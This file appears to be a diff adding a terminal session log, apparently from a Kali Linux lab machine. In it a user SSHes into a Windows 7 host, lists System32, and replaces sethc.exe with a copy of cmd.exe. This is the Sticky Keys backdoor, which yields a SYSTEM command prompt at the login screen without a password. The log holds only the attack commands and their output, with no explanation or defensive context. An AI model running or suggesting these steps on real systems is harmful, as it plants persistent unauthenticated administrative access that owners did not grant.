@@ -1,0 +1,41 @@
+┌──(kali㉿kali)-[/usr/kali]
+┌──(kali㉿kali)-[/usr/kali]
+└─$ ssh stephan@192.168.29.200
+stephan@192.168.29.200's password: 
+
+Microsoft Windows [Version 6.1.7600]                                                                                            
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                                 
+
+stephan@HOMEPC C:\Users\stephan>cd C:\Windows\System32                                                                          
+
+stephan@HOMEPC C:\Windows\System32>ls -l                                                                                        
+'ls' is not recognized as an internal or external command,                                                                      
+operable program or batch file.                                                                                                 
+
+stephan@HOMEPC C:\Windows\System32>dir                                                                                          
+ Volume in drive C has no label.                                                                                                
+ Volume Serial Number is 5A01-054A                                                                                              
+
+ Directory of C:\Windows\System32                                                                                               
+
+12/23/2022  06:50 AM    <DIR>          .                                                                                        
+12/23/2022  06:50 AM    <DIR>          ..                                                                                       
+07/13/2009  09:37 PM    <DIR>          0409                                                                                     
+07/13/2009  05:39 PM           158,208 aaclient.dll                                                                             
+07/13/2009  05:40 PM         3,745,792 accessibilitycpl.dll                                                                     
+07/13/2009  05:24 PM            39,424 ACCTRES.dll                                                                              
+07/13/2009  05:40 PM             9,216 acledit.dll                                                                              
+[...]
+07/13/2009  05:41 PM           366,080 zipfldr.dll                                                                                                                     
+            2553 File(s)  1,106,306,968 bytes                                                                                                                          
+              89 Dir(s)  21,280,944,128 bytes free                                                                                                                     
+                                                                                                                                                                       
+stephan@HOMEPC C:\Windows\System32>rename sethc.exe sethc-old.exe                                                                                                      
+                                                                                                                                                                       
+stephan@HOMEPC C:\Windows\System32>copy cmd.exe sethc.exe                                                                                                              
+        1 file(s) copied.                                                                                                                                              
+                                                                                                                                                                       
+stephan@HOMEPC C:\Windows\System32>exitConnection to 192.168.29.200 closed.                                                                                            
+                                                                                                                                                                       
+┌──(kali㉿kali)-[/usr/kali]
+└─$ 
